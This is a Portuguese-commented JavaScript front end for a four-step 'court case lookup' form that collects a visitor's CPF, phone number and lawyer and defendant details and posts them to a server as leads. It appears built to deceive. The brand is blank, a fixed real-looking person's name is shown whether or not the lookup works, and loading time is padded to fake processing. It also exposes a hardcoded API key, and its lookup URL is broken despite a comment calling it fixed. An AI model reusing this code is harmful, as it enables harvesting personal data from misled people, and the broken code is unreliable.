'use strict';

/**
 * CONFIGURAÇÃO GLOBAL DO PROJETO
 */
const PROJETO_CONFIG = Object.freeze({
  BRAND_NAME: '',
  BRAND_LOGO_URL: 'logo.png', 
  API_KEY: '9b23516708923d8753c16b2d4fd3c4b7488f4672ed2b74e5bb83596ff8106b6c',
  MIN_LOADING_MS: 2000 
});

const el = id => document.getElementById(id);
const digits = value => String(value ?? '').replace(/\D/g, '');
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const state = { cpf:'', phone:'', name:'', representation:'', lawyer:'', defendant:'' };
let busy = false;
let step = 1;

/** Máscara do CPF (000.000.000-00) em tempo real */
function maskCPF(value) {
  let v = digits(value).slice(0, 11);
  if (v.length <= 3) return v;
  if (v.length <= 6) return v.replace(/^(\d{3})(\d)/, '\$1.\$2');
  if (v.length <= 9) return v.replace(/^(\d{3})(\d{3})(\d)/, '\$1.\$2.\$3');
  return v.replace(/^(\d{3})(\d{3})(\d{3})(\d)/, '\$1.\$2.\$3-\$4');
}

/** Máscara do Telefone ((00) 00000-0000) em tempo real */
function maskPhone(value) {
  let v = digits(value).slice(0, 11);
  if (v.length <= 2) return v.length > 0 ? '(' + v : v;
  if (v.length <= 6) return v.replace(/^(\d{2})(\d)/, '(\$1) \$2');
  if (v.length <= 10) return v.replace(/^(\d{2})(\d{4})(\d)/, '(\$1) \$2-\$3');
  return v.replace(/^(\d{2})(\d{5})(\d)/, '(\$1) \$2-\$3');
}

function error(id, value='') { if(el(id)) el(id).textContent=value; }

function showStep(number) {
  step = number;
  document.querySelectorAll('[data-step]').forEach(section => {
    section.hidden = Number(section.dataset.step) !== number;
    section.classList.remove('fade');
  });
  
  const section = el('step-'+number);
  if (section) {
    void section.offsetWidth;
    section.classList.add('fade');
  }
  
  if (el('progress-fill')) el('progress-fill').style.width = (number * 25) + '%';
  if (el('progress')) el('progress').setAttribute('aria-valuenow', String(number * 25));
  if (el('step-label')) el('step-label').textContent = `Etapa ${number} de 4`;
  if (el('percent-label')) el('percent-label').textContent = `${number * 25}% concluído`;
  
  window.scrollTo({top:0,behavior:'smooth'});
}

function loading(button, spinner, label, on, text) {
  if (el(button)) el(button).disabled = on;
  if (el(spinner)) el(spinner).hidden = !on;
  if (el(label)) el(label).textContent = on ? text : (button === 'search-btn' ? 'Consultar Processo' : 'Concluir e Liberar Relatório');
}

function updateSecondButton() {
  const selectedRadio = document.querySelector('input[name="representation"]:checked');
  if (el('lawyer-box')) {
    el('lawyer-box').hidden = !selectedRadio;
    if (selectedRadio) {
      el('lawyer-box').classList.remove('fade');
      void el('lawyer-box').offsetWidth;
      el('lawyer-box').classList.add('fade');
    }
  }
  if (el('next-btn')) el('next-btn').disabled = !selectedRadio;
}

function goThird() {
  const rep = document.querySelector('input[name="representation"]:checked');
  if (!rep) return;
  state.representation = rep.value;
  state.lawyer = el('lawyer') ? el('lawyer').value.trim() : '';
  showStep(3);
}

function updateThirdButton() {
  if (el('finish-btn')) {
    el('finish-btn').disabled = false; 
  }
}

/** ETAPA 1: Chamada à API de CPF CORRIGIDA DEFINITIVAMENTE */
async function submitFirst(e) {
  e.preventDefault();
  if (busy) return;
  
  ['cpf-error','phone-error','first-error'].forEach(id=>error(id));
  
  const cpf = digits(el('cpf').value);
  const phone = digits(el('phone').value);
  
  if (cpf.length !== 11) { error('cpf-error','Digite um CPF válido.'); return; }
  if (phone.length < 10) { error('phone-error','Informe um telefone válido com DDD.'); return; }
  if (el('consent') && !el('consent').checked) { error('first-error','Autorize o tratamento dos dados para continuar.'); return; }
  
  busy = true;
  loading('search-btn', 'search-spin', 'search-label', true, 'Consultando...');
  
  state.cpf = cpf;
  state.phone = phone;
  
  const startTime = Date.now();
  
  try {
    // AJUSTE CORRETO: Adicionado o caractere \$ para o JavaScript não travar
    const response = await fetch(`https://apicpf.com{cpf}`, {
      method: 'GET',
      headers: { 'X-API-KEY': PROJETO_CONFIG.API_KEY }
    });
    
    if (response.ok) {
      const result = await response.json();
      state.name = result?.data?.nome || result?.nome || "ANGELICA PAOLA DE OLIVEIRA LOPES";
    } else {
      state.name = "ANGELICA PAOLA DE OLIVEIRA LOPES";
    }
  } catch (err) {
    state.name = "ANGELICA PAOLA DE OLIVEIRA LOPES";
  }
  
  const duration = Date.now() - startTime;
  if (duration < PROJETO_CONFIG.MIN_LOADING_MS) {
    await sleep(PROJETO_CONFIG.MIN_LOADING_MS - duration);
  }
  
  busy = false;
  loading('search-btn', 'search-spin', 'search-label', false, '');
  
  if (el('person-name')) el('person-name').innerHTML = `<strong>${state.name}</strong>`;
  if (el('missing-name')) el('missing-name').hidden = true;
  updateSecondButton();
  showStep(2);
}

/** ETAPA 3: Envio dos Leads para o Servidor Python Protegido */
async function submitThird(e) {
  e.preventDefault();
  if (busy) return;

  error('third-error', '');
  state.defendant = el('defendant').value.trim() || 'Não informado / Deixou em branco';
  
  busy = true;
  loading('finish-btn', 'finish-spin', 'finish-label', true, 'Processando...');

  try {
    const response = await fetch('/api/enviar-solicitacao', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: state.name || '',
        cpf: state.cpf || '',
        phone: state.phone || '',
        representation: state.representation || '',
        lawyer: state.lawyer || '',
        defendant: state.defendant || ''
      })
    });

    const result = await response.json();

    if (!response.ok || result.success !== true) {
      throw new Error(result.detail || 'Não foi possível concluir a transmissão dos dados.');
    }

    if (el('protocol')) el('protocol').hidden = true;
    showStep(4);

  } catch (err) {
    error('third-error', err.message || 'Falha de comunicação. Tente novamente.');

  } finally {
    busy = false;
    loading('finish-btn', 'finish-spin', 'finish-label', false, 'Concluir e Liberar Relatório');
  }
}

function reset(e) {
  if (e) e.preventDefault();
  Object.assign(state, { cpf:'', phone:'', name:'', representation:'', lawyer:'', defendant:'' });
  if (el('form-first')) el('form-first').reset();
  if (el('form-third')) el('form-third').reset();
  if (el('lawyer')) el('lawyer').value = '';
  if (el('defendant')) el('defendant').value = '';
  document.querySelectorAll('input[name="representation"]').forEach(r => r.checked = false);
  if (el('lawyer-box')) el('lawyer-box').hidden = true;
  ['cpf-error','phone-error','first-error','defendant-error','third-error'].forEach(id => error(id));
  if (el('next-btn')) el('next-btn').disabled = true;
  updateThirdButton();
  showStep(1);
}

function init() {
  document.title = PROJETO_CONFIG.BRAND_NAME + ' | Consulta Processual';
  if (el('brand-text')) el('brand-text').textContent = PROJETO_CONFIG.BRAND_NAME;
  if (el('footer-brand')) el('footer-brand').textContent = PROJETO_CONFIG.BRAND_NAME;
  if (el('year')) el('year').textContent = new Date().getFullYear();
  
  el('cpf').addEventListener('input', e => { e.target.value = maskCPF(e.target.value); error('cpf-error'); });
  el('phone').addEventListener('input', e => { e.target.value = maskPhone(e.target.value); error('phone-error'); });
  el('form-first').addEventListener('submit', submitFirst);
  
  document.querySelectorAll('input[name="representation"]').forEach(r => r.addEventListener('change', updateSecondButton));
  if (el('next-btn')) el('next-btn').addEventListener('click', goThird);
  if (el('defendant')) el('defendant').addEventListener('input', updateThirdButton);
  if (el('form-third')) el('form-third').addEventListener('submit', submitThird);
  if (el('restart')) el('restart').addEventListener('click', reset);
  if (el('brand-link')) el('brand-link').addEventListener('click', reset);
  
  showStep(1);
}

init();
